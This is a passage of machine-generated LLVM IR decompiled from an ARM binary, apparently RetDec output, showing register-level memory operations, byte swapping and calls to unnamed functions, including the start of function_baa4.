  %v4_b870 = inttoptr i32 %v3_b870 to i16*
  store i16 %v1_b870, i16* %v4_b870, align 2
  %v0_b874 = load i32, i32* @r8, align 4
  %v1_b874 = add i32 %v0_b874, 12
  %v2_b874 = inttoptr i32 %v1_b874 to i8*
  %v3_b874 = load i8, i8* %v2_b874, align 1
  %v4_b874 = zext i8 %v3_b874 to i32
  store i32 %v4_b874, i32* %r3.global-to-local, align 4
  %v1_b878 = add i32 %v0_b874, 13
  %v2_b878 = inttoptr i32 %v1_b878 to i8*
  %v3_b878 = load i8, i8* %v2_b878, align 1
  %v4_b878 = zext i8 %v3_b878 to i32
  %tmp104 = urem i8 %v3_b874, 16
  %v1_b87c = zext i8 %tmp104 to i32
  %v1_b880 = or i32 %v1_b87c, 128
  store i32 %v1_b880, i32* %r3.global-to-local, align 4
  %v1_b884 = or i32 %v4_b878, 16
  store i32 %v1_b884, i32* %r2.global-to-local, align 4
  %v0_b888 = load i32, i32* %r1.global-to-local, align 4
  %v2_b888 = add i32 %v0_b874, 8
  %v3_b888 = inttoptr i32 %v2_b888 to i32*
  store i32 %v0_b888, i32* %v3_b888, align 4
  %v0_b88c = load i32, i32* %r3.global-to-local, align 4
  %v1_b88c = trunc i32 %v0_b88c to i8
  %v2_b88c = load i32, i32* @r8, align 4
  %v3_b88c = add i32 %v2_b88c, 12
  %v4_b88c = inttoptr i32 %v3_b88c to i8*
  store i8 %v1_b88c, i8* %v4_b88c, align 1
  %v0_b890 = load i32, i32* %r2.global-to-local, align 4
  %v1_b890 = trunc i32 %v0_b890 to i8
  %v2_b890 = load i32, i32* @r8, align 4
  %v3_b890 = add i32 %v2_b890, 13
  %v4_b890 = inttoptr i32 %v3_b890 to i8*
  store i8 %v1_b890, i8* %v4_b890, align 1
  %v0_b894 = call i32 @function_e094()
  %v1_b894 = trunc i32 %v0_b894 to i16
  store i32 %v0_b894, i32* %r0.global-to-local, align 4
  store i32 %v1_b3d8, i32* %r1.global-to-local, align 4
  %v0_b89c = load i32, i32* @r8, align 4
  %v1_b89c = add i32 %v0_b89c, 13
  %v2_b89c = inttoptr i32 %v1_b89c to i8*
  %v3_b89c = load i8, i8* %v2_b89c, align 1
  %v4_b89c = zext i8 %v3_b89c to i32
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v1_b8a4 = and i32 %v4_b89c, 223
  %v5_b8a8 = or i32 %v1_b8a4, %v4_b8a8
  store i32 %v5_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v5_b8a8 to i8
  store i8 %v1_b8ac, i8* %v2_b89c, align 1
  store i32 %v1_b3f8, i32* %ip.global-to-local, align 4
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 13
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v1_b8b8, i32* %r3.global-to-local, align 4
  %v1_b8bc = and i32 %v4_b8b4, 239
  %v5_b8c0 = or i32 %v1_b8bc, %v4_b8c0
  store i32 %v5_b8c0, i32* %r2.global-to-local, align 4
  %v1_b8c4 = trunc i32 %v5_b8c0 to i8
  store i8 %v1_b8c4, i8* %v2_b8b4, align 1
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8cc = load i32, i32* @r8, align 4
  %v1_b8cc = add i32 %v0_b8cc, 13
  %v2_b8cc = inttoptr i32 %v1_b8cc to i8*
  %v3_b8cc = load i8, i8* %v2_b8cc, align 1
  %v4_b8cc = zext i8 %v3_b8cc to i32
  store i32 %v1_b8d0, i32* %r2.global-to-local, align 4
  %v1_b8d4 = and i32 %v4_b8cc, 247
  %v5_b8d8 = or i32 %v1_b8d4, %v4_b8d8
  store i32 %v5_b8d8, i32* %r3.global-to-local, align 4
  %v1_b8dc = trunc i32 %v5_b8d8 to i8
  store i8 %v1_b8dc, i8* %v2_b8cc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8e4 = load i32, i32* @r8, align 4
  %v1_b8e4 = add i32 %v0_b8e4, 13
  %v2_b8e4 = inttoptr i32 %v1_b8e4 to i8*
  %v3_b8e4 = load i8, i8* %v2_b8e4, align 1
  %v4_b8e4 = zext i8 %v3_b8e4 to i32
  store i32 %v1_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = and i32 %v4_b8e4, 251
  %v5_b8f0 = or i32 %v1_b8ec, %v4_b8f0
  store i32 %v5_b8f0, i32* %r2.global-to-local, align 4
  %v1_b8f4 = trunc i32 %v5_b8f0 to i8
  store i8 %v1_b8f4, i8* %v2_b8e4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b8fc = load i32, i32* @r8, align 4
  %v1_b8fc = add i32 %v0_b8fc, 13
  %v2_b8fc = inttoptr i32 %v1_b8fc to i8*
  %v3_b8fc = load i8, i8* %v2_b8fc, align 1
  %v4_b8fc = zext i8 %v3_b8fc to i32
  store i32 %v1_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = and i32 %v4_b8fc, 253
  %v4_b908 = or i32 %v1_b904, %v3_b908
  store i32 %v4_b908, i32* %r3.global-to-local, align 4
  %v1_b90c = trunc i32 %v4_b908 to i8
  store i8 %v1_b90c, i8* %v2_b8fc, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b914 = load i32, i32* @r8, align 4
  %v1_b914 = add i32 %v0_b914, 13
  %v2_b914 = inttoptr i32 %v1_b914 to i8*
  %v3_b914 = load i8, i8* %v2_b914, align 1
  %v4_b914 = zext i8 %v3_b914 to i32
  %v1_b91c = and i32 %v4_b914, 254
  store i32 %v1_b91c, i32* %r2.global-to-local, align 4
  %v2_b920 = or i32 %v1_b91c, %v1_b918
  store i32 %v2_b920, i32* %r3.global-to-local, align 4
  %v1_b924 = trunc i32 %v2_b920 to i8
  store i8 %v1_b924, i8* %v2_b914, align 1
  %v3_b928 = load i32, i32* @r8, align 4
  %v4_b928 = add i32 %v3_b928, 14
  %v5_b928 = inttoptr i32 %v4_b928 to i16*
  store i16 %v1_b894, i16* %v5_b928, align 2
  store i32 %v6_b490, i32* %r1.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  %v1_b930 = add i32 %v0_b930, 40
  store i32 %v1_b930, i32* %r0.global-to-local, align 4
  %v2_b934 = inttoptr i32 %v1_b930 to i16*
  %v3_b934 = call i32 @function_e228(i16* %v2_b934, i32 %v6_b490)
  store i32 %v3_b934, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b688

dec_label_pc_b93c:                                ; preds = %dec_label_pc_b4fc
  store i32 %v6_b490, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b490, 40
  br label %dec_label_pc_b94c

dec_label_pc_b94c:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b93c
  %storemerge6.pre-phi = phi i32 [ %v1_b78c, %dec_label_pc_b69c ], [ %.pre, %dec_label_pc_b93c ]
  %v0_b96026 = phi i32 [ %v1_b690, %dec_label_pc_b69c ], [ 0, %dec_label_pc_b93c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b490, 65536
  %storemerge = add i32 %v6_b490, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b94c = add i32 %storemerge4, 1310720
  store i32 %v1_b94c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b94c, 256
  %v3_b954 = and i32 %tmp83, 65280
  store i32 %v3_b954, i32* %r3.global-to-local, align 4
  %v4_b958 = udiv i32 %v1_b94c, 16777216
  %v5_b958 = or i32 %v3_b954, %v4_b958
  store i32 %v5_b958, i32* @r8, align 4
  %v2_ba84 = icmp eq i32 %v1_b4b0, 0
  br label %dec_label_pc_b95c

dec_label_pc_b95c:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_ba68, %dec_label_pc_b94c
  %v0_b960 = phi i32 [ %v0_b96026, %dec_label_pc_b94c ], [ 0, %dec_label_pc_ba68 ], [ 0, %dec_label_pc_b95c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b960 = icmp eq i32 %v0_b960, 0
  store i1 %v2_b960, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b960, label %dec_label_pc_b95c, label %dec_label_pc_b96c

dec_label_pc_b96c:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_ba68
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b970

dec_label_pc_b970:                                ; preds = %dec_label_pc_b998, %dec_label_pc_b96c
  %v1_b978 = phi i32 [ %v1_ba58, %dec_label_pc_b998 ], [ 0, %dec_label_pc_b96c ]
  store i32 %v2_b31c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b978 = mul i32 %v1_b978, 4
  %v5_b978 = add i32 %v4_b978, %v2_b31c
  %v6_b978 = inttoptr i32 %v5_b978 to i32*
  %v7_b978 = load i32, i32* %v6_b978, align 4
  store i32 %v7_b978, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b980 = load i32, i32* @fp, align 4
  %v9_b980 = icmp eq i32 %v0_b980, 65535
  store i1 %v9_b980, i1* %cpsr_z.global-to-local, align 1
  %v1_b984 = add i32 %v7_b978, 20
  store i32 %v1_b984, i32* @r5, align 4
  br i1 %v9_b980, label %dec_label_pc_ba7c, label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b970
  store i32 %v1_b4b0, i32* %r3.global-to-local, align 4
  store i1 %v2_ba84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ba84, label %dec_label_pc_b998, label %dec_label_pc_ba90

dec_label_pc_b998:                                ; preds = %dec_label_pc_b98c, %dec_label_pc_ba7c, %dec_label_pc_ba90
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b99c = load i32, i32* @r4, align 4
  %v3_b99c = add i32 %v2_b99c, 10
  %v4_b99c = inttoptr i32 %v3_b99c to i16*
  store i16 0, i16* %v4_b99c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* @r0, align 4
  %v2_b9a8 = call i32 @function_c848(i32 %v0_b9a4, i32 20)
  %v3_b9a8 = trunc i32 %v2_b9a8 to i16
  store i32 %v2_b9a8, i32* %r0.global-to-local, align 4
  %v3_b9ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b30c, i32* %r2.global-to-local, align 4
  %v3_b9b4 = mul i32 %v3_b9ac, 16
  %v2_b9b8 = add i32 %v3_b9b4, %v2_b30c
  store i32 %v2_b9b8, i32* %r1.global-to-local, align 4
  %v1_b9bc = add i32 %v2_b9b8, 4
  %v2_b9bc = inttoptr i32 %v1_b9bc to i32*
  %v3_b9bc = load i32, i32* %v2_b9bc, align 4
  %v3_b9c0 = mul i32 %v3_b9bc, 65536
  store i32 %v3_b9c0, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9bc, 256
  %v1_b9c8 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b9bc, 256
  %v4_b9cc = urem i32 %tmp86, 256
  %v5_b9cc = or i32 %v4_b9cc, %v1_b9c8
  store i32 %v5_b9cc, i32* %r3.global-to-local, align 4
  %v1_b9d0 = add i32 %v3_b9bc, 1
  store i32 %v1_b9d0, i32* %r2.global-to-local, align 4
  store i32 %v1_b9d0, i32* %v2_b9bc, align 4
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = load i32, i32* @r5, align 4
  %v2_b9d8 = add i32 %v1_b9d8, 4
  %v3_b9d8 = inttoptr i32 %v2_b9d8 to i32*
  store i32 %v0_b9d8, i32* %v3_b9d8, align 4
  %v0_b9dc = load i32, i32* %r1.global-to-local, align 4
  %v1_b9dc = add i32 %v0_b9dc, 8
  %v2_b9dc = inttoptr i32 %v1_b9dc to i32*
  %v3_b9dc = load i32, i32* %v2_b9dc, align 4
  %tmp87 = mul i32 %v3_b9dc, 256
  %v1_b9e8 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b9dc, 256
  %v4_b9ec = urem i32 %tmp88, 256
  %v5_b9ec = or i32 %v4_b9ec, %v1_b9e8
  %v1_b9f0 = load i32, i32* @r5, align 4
  %v2_b9f0 = add i32 %v1_b9f0, 8
  %v3_b9f0 = inttoptr i32 %v2_b9f0 to i32*
  store i32 %v5_b9ec, i32* %v3_b9f0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b9f8 = load i32, i32* @r4, align 4
  %v4_b9f8 = add i32 %v3_b9f8, 10
  %v5_b9f8 = inttoptr i32 %v4_b9f8 to i16*
  store i16 %v3_b9a8, i16* %v5_b9f8, align 2
  %v0_b9fc = load i32, i32* @r5, align 4
  store i32 %v0_b9fc, i32* @r1, align 4
  %v0_ba00 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba00 = trunc i32 %v0_ba00 to i16
  %v3_ba00 = add i32 %v0_b9fc, 16
  %v4_ba00 = inttoptr i32 %v3_ba00 to i16*
  store i16 %v1_ba00, i16* %v4_ba00, align 2
  %v0_ba04 = load i32, i32* @r8, align 4
  store i32 %v0_ba04, i32* %r2.global-to-local, align 4
  %v0_ba08 = load i32, i32* @sl, align 4
  store i32 %v0_ba08, i32* %r3.global-to-local, align 4
  %v0_ba0c = load i32, i32* @r4, align 4
  store i32 %v0_ba0c, i32* %r0.global-to-local, align 4
  %v4_ba10 = call i32 @function_c898(i32 %v0_ba0c, i32 %v0_b9fc, i32 %v0_ba04, i32 %v0_ba08)
  %v5_ba10 = trunc i32 %v4_ba10 to i16
  store i32 %v4_ba10, i32* %r0.global-to-local, align 4
  %v3_ba14 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba14, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba1c = mul i32 %v3_ba14, 32
  store i32 %v3_ba1c, i32* %lr.global-to-local, align 4
  %v3_ba20 = load i32, i32* @r5, align 4
  %v4_ba20 = add i32 %v3_ba20, 16
  %v5_ba20 = inttoptr i32 %v4_ba20 to i16*
  store i16 %v5_ba10, i16* %v5_ba20, align 2
  %v0_ba24 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba24 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba24, -8
  %v5_ba24 = add i32 %v0_ba24, %tmp105
  store i32 %v5_ba24, i32* %lr.global-to-local, align 4
  %v0_ba28 = load i32, i32* @r5, align 4
  %v1_ba28 = add i32 %v0_ba28, 2
  %v2_ba28 = inttoptr i32 %v1_ba28 to i16*
  %v3_ba28 = load i16, i16* %v2_ba28, align 2
  %v1_ba2c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba2c = add i32 %v1_ba2c, %v5_ba24
  store i32 %v2_ba2c, i32* @lr, align 4
  %v3_ba30 = add i32 %v2_ba2c, 2
  %v4_ba30 = inttoptr i32 %v3_ba30 to i16*
  store i16 %v3_ba28, i16* %v4_ba30, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba3c = load i32, i32* @r4, align 4
  store i32 %v0_ba3c, i32* %r1.global-to-local, align 4
  %v0_ba40 = load i32, i32* @sb, align 4
  store i32 %v0_ba40, i32* %r0.global-to-local, align 4
  %v0_ba44 = load i32, i32* @r7, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @lr, align 4
  %v6_ba50 = call i32 @function_11338(i32 %v0_ba40, i32 %v0_ba3c, i32 %v0_ba44, i32 16384, i32 %v0_ba48, i32 16)
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  %v1_ba58 = add i32 %v3_ba54, 1
  store i32 %v1_ba58, i32* %r0.global-to-local, align 4
  %v0_ba5c = load i32, i32* @r6, align 4
  %v9_ba5c = icmp eq i32 %v0_ba5c, %v1_ba58
  store i1 %v9_ba5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba58, i32* %stack_var_-44, align 4
  %v8_ba64 = icmp sgt i32 %v0_ba5c, %v1_ba58
  br i1 %v8_ba64, label %dec_label_pc_b970, label %dec_label_pc_ba68

dec_label_pc_ba68:                                ; preds = %dec_label_pc_b998
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ba6c = icmp eq i32 %v0_ba5c, 0
  store i1 %v2_ba6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba6c, label %dec_label_pc_b95c, label %dec_label_pc_b96c

dec_label_pc_ba7c:                                ; preds = %dec_label_pc_b970
  %v0_ba7c = call i32 @function_e094()
  %v1_ba7c = trunc i32 %v0_ba7c to i16
  store i32 %v0_ba7c, i32* %r0.global-to-local, align 4
  store i32 %v1_b4b0, i32* %r3.global-to-local, align 4
  store i1 %v2_ba84, i1* %cpsr_z.global-to-local, align 1
  %v3_ba88 = load i32, i32* @r4, align 4
  %v4_ba88 = add i32 %v3_ba88, 4
  %v5_ba88 = inttoptr i32 %v4_ba88 to i16*
  store i16 %v1_ba7c, i16* %v5_ba88, align 2
  br i1 %v2_ba84, label %dec_label_pc_b998, label %dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge

dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge:    ; preds = %dec_label_pc_ba7c
  %v0_ba90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ba90

dec_label_pc_ba90:                                ; preds = %dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge, %dec_label_pc_b98c
  %v0_ba90 = phi i32 [ %v0_ba90.pre, %dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge ], [ %v7_b978, %dec_label_pc_b98c ]
  %v1_ba90 = add i32 %v0_ba90, 40
  store i32 %v1_ba90, i32* %r0.global-to-local, align 4
  store i32 %v6_b490, i32* %r1.global-to-local, align 4
  %v2_ba98 = inttoptr i32 %v1_ba90 to i16*
  %v3_ba98 = call i32 @function_e228(i16* %v2_ba98, i32 %v6_b490)
  store i32 %v3_ba98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b998

; uselistorder directives
  uselistorder i32 %v0_ba7c, { 1, 0 }
  uselistorder i32 %v1_ba58, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba24, { 1, 0 }
  uselistorder i32 %v4_ba10, { 1, 0 }
  uselistorder i32 %v3_b9dc, { 1, 0 }
  uselistorder i32 %v3_b9bc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9a8, { 1, 0 }
  uselistorder i1 %v2_ba84, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b894, { 1, 0 }
  uselistorder i32 %v0_b7cc, { 1, 0 }
  uselistorder i32 %v5_b760, { 1, 0 }
  uselistorder i32 %v0_b720, { 1, 0 }
  uselistorder i32 %v0_b6dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b68c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b678, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b604, { 1, 0 }
  uselistorder i32 %v6_b5fc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b62c, { 1, 0 }
  uselistorder i32 %v4_b640, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b588, { 1, 0, 2 }
  uselistorder i32 %v0_b738, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b578, { 1, 0 }
  uselistorder i1 %v7_b570, { 1, 0, 2 }
  uselistorder i1 %v7_b524, { 1, 0 }
  uselistorder i32 %v3_b520, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b900, { 1, 0 }
  uselistorder i32 %v1_b8e8, { 1, 0 }
  uselistorder i32 %v1_b8d0, { 1, 0 }
  uselistorder i32 %v1_b8b8, { 1, 0 }
  uselistorder i32 %v1_b8a0, { 1, 0 }
  uselistorder i32 %v3_b638, { 1, 0 }
  uselistorder i1 %v2_b654, { 1, 0 }
  uselistorder i32 %v1_b650, { 1, 0 }
  uselistorder i32 %v4_b64c, { 2, 0, 1 }
  uselistorder i32 %v2_b560, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b4fc, { 1, 0 }
  uselistorder i1 %v7_b4f4, { 1, 0 }
  uselistorder i1 %v7_b4c8, { 1, 0 }
  uselistorder i32 %v3_b4c4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4b0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b490, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v1_b3f8, { 1, 0 }
  uselistorder i32 %v1_b3d8, { 1, 0 }
  uselistorder i32 %v6_b3b4, { 1, 0 }
  uselistorder i32 %v1_b39c, { 1, 0 }
  uselistorder i8 %v5_b354, { 1, 0 }
  uselistorder i32 %v6_b334, { 1, 0 }
  uselistorder i32 %v2_b31c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b30c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 12, 10, 16, 11, 13, 14, 15, 20, 17, 18, 19, 22, 21, 23, 26, 25, 24, 27, 28, 29, 31, 32, 30, 56, 34, 33, 35, 36, 37, 39, 38, 57, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b998, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b96c, { 1, 0 }
  uselistorder label %dec_label_pc_b95c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b94c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b688, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b5c4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5a4, { 1, 0 }
  uselistorder label %dec_label_pc_b580, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b530, { 1, 0 }
  uselistorder label %dec_label_pc_b514, { 1, 0 }
}

define i32 @function_baa4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_baa4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_baa4 = load i32, i32* @sb, align 4
  %v24_baa4 = load i32, i32* @fp, align 4
  %v27_baa4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bac0 = call i32 @function_11f24(i32 %arg1, i32 4)
  %v0_bac4 = load i32, i32* @r5, align 4
  store i32 %v0_bac4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bad4 = load i32, i32* @r4, align 4
  store i32 %v0_bad4, i32* %r0.global-to-local, align 4
  %v5_bad8 = inttoptr i32 %v0_bac4 to i32*
  %v6_bad8 = call i32 @function_8570(i32 %v0_bad4, i32* %v5_bad8, i32 2, i32 0)
  %v1_bae4 = urem i32 %v6_bad8, 256
  store i32 %v1_bae4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_baf0 = load i32, i32* @r5, align 4
  store i32 %v0_baf0, i32* %r1.global-to-local, align 4
  %v0_baf4 = load i32, i32* @r4, align 4
  store i32 %v0_baf4, i32* %r0.global-to-local, align 4
  %v6_bafc = inttoptr i32 %v0_baf0 to i32*
  %v7_bafc = call i32 @function_8570(i32 %v0_baf4, i32* %v6_bafc, i32 3, i32 65535)
  %v0_bb00 = load i32, i32* @r5, align 4
  store i32 %v0_bb00, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bafc, i32* %sb.global-to-local, align 4
  %v0_bb10 = load i32, i32* @r4, align 4
  store i32 %v0_bb10, i32* %r0.global-to-local, align 4
  %v4_bb14 = inttoptr i32 %v0_bb00 to i32*
  %v5_bb14 = call i32 @function_8570(i32 %v0_bb10, i32* %v4_bb14, i32 4, i32 64)
  %v1_bb1c = urem i32 %v5_bb14, 256
  store i32 %v1_bb1c, i32* %ip.global-to-local, align 4
  %v0_bb20 = load i32, i32* @r5, align 4
  store i32 %v0_bb20, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb2c = load i32, i32* @r4, align 4
  store i32 %v0_bb2c, i32* %r0.global-to-local, align 4
  %v6_bb34 = inttoptr i32 %v0_bb20 to i32*
  %v7_bb34 = call i32 @function_8570(i32 %v0_bb2c, i32* %v6_bb34, i32 5, i32 0)
  %v1_bb40 = urem i32 %v7_bb34, 256
  store i32 %v1_bb40, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb4c = load i32, i32* @r5, align 4
  store i32 %v0_bb4c, i32* %r1.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
  %v5_bb58 = inttoptr i32 %v0_bb4c to i32*
  %v6_bb58 = call i32 @function_8570(i32 %v0_bb50, i32* %v5_bb58, i32 6, i32 65535)
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb58, i32* @r6, align 4
  %v0_bb70 = load i32, i32* @r4, align 4
  store i32 %v0_bb70, i32* %r0.global-to-local, align 4
  %v4_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v5_bb74 = call i32 @function_8570(i32 %v0_bb70, i32* %v4_bb74, i32 7, i32 65535)
  %v0_bb7c = load i32, i32* @r5, align 4
  store i32 %v0_bb7c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bb74, i32* @sl, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  %v4_bb90 = inttoptr i32 %v0_bb7c to i32*
  %v5_bb90 = call i32 @function_8570(i32 %v0_bb8c, i32* %v4_bb90, i32 17, i32 65535)
